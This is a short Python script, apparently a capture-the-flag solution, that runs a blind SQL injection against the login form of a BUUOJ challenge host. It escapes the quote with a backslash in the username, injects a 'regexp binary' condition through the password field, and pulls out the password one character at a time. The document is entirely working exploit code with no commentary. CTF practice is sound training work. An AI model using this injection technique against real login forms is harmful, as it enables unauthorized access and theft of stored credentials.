import binascii,requests

url='http://48cc8db7-0de0-47bc-8597-ca3b15c969c0.node3.buuoj.cn/index.php'
key=''
headers = {
      'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
      'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Connection':'keep-alive'
    }


while 1:

    for i in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789':
        keyword='^'+key+i
        data={
            'username':'admin\\',
            'password':'or password regexp binary 0x{}#'.format(binascii.b2a_hex(keyword.encode()).decode())
        }

        res=requests.post(url,data=data,headers=headers).text
        if 'stronger' in res:
            key+=i
            print(key)
            break